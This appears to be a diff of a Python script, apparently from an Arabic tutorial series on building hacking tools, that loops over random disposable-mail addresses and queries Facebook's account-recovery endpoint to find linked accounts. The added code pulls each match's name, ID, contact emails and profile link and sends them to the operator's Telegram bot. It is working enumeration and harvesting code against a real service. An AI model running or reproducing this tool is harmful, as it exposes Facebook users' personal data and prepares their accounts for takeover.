@@ -1,34 +1,21 @@
 
-#سلام عليكم ورحمة الله تعالى وبركاته
 
-#درس الرابع من سلسلة صنع ادوات بايثون من الصفر
-
-#درس ليوم صنع اداة فيسبوك ربط العاب بناء عطلبكم
-
-
-
-#هذا شرح ليوم اتمنى استفدتو 
-
-#شرح مقدم من المطور ابراهيم الجزائري 😍
-
-
-
-
-
-
-
-import os,sys,json
-import requests,random
+import os,sys
+import requests,random,json
 
 OK = 0
 BAD = 0
 
+R = '\x1b[38;5;1m'   # أحمر
+M = '\x1b[38;5;244m' # رمادي 
+L = '\x1b[38;5;10m' #اخضر 
+G = '\x1b[38;5;190m'
 os.system("clear")
 
-tok=input(" Token :")
+tok=input(f"{L} Token :")
 os.system("clear")
 
-id=input(" id :")
+id=input(f"{L} id :")
 os.system("clear")
 
 def send_telegram(message):
@@ -39,20 +26,16 @@ def send_telegram(message):
     except:
         pass
 
-                
-        
-        
+if not tok or not id:
+	print(R+" توكن وايدي لازم تدخلهم ")
+	sys.exit()
+
 ibra = "qwertyuioplkjhgfdsamnbvcxz"
-idom = ["@yopmail.com","@telegmail.com","@hi2.in"]
 
 while True:
-	dom = random.choice(idom)
-	len = random.randint(2,6)
-	email ="".join(random.choice(ibra) for _ in range (len)) + dom
+	len = random.randint(3,7)
 	
-#	نيجب اتصال فيسبوك انا عندي اتصال من قبل 
-
-
+	email ="".join(random.choice(ibra) for _ in range (len)) + "@yopmail.com"
 
 	headers = {
 	    'Host': 'b-graph.facebook.com',
@@ -78,15 +61,27 @@ while True:
 	
 	response = requests.post('https://b-graph.facebook.com/recover_accounts', headers=headers, data=data).text
 	
+
 	if '"data":[' in response and '"data":[]' not in response:
-		msg = f" Good Facbook : {email}"
-		send_telegram(msg)
-		OK += 1
-	else:
-		 BAD += 1
-
-	print(f"\r Good : {OK} | BAD : {BAD} | {email}",end="")
-
-
+	    OK += 1
+	    result = json.loads(response)
+	    account = result['data'][0]
+	    name = account.get('name', 'N/A')
+	    user_id = account.get('id', 'N/A')
+	    contacts = account.get('contactpoints', {}).get('data', [])
+	    emails = []
+	    for contact in contacts:
+	        if contact.get('type') == 'EMAIL':
+	            emails.append(contact.get('display', 'N/A'))
+	    profile_pic = account.get('profile_pic_uri', 'N/A')  
 	
-		 	
+	    msg = f"""✅ OK!
+Name or email : {name}
+ID Fecbook : {user_id}
+Emails : {', '.join(emails)}
+ Link : https://www.facebook.com/{user_id}"""
+	    send_telegram(msg)
+	
+	else:
+	    BAD += 1
+	print(f"\r{L} GOOD : {OK} | {R} BAD : {BAD} | {G} {email}",end="")
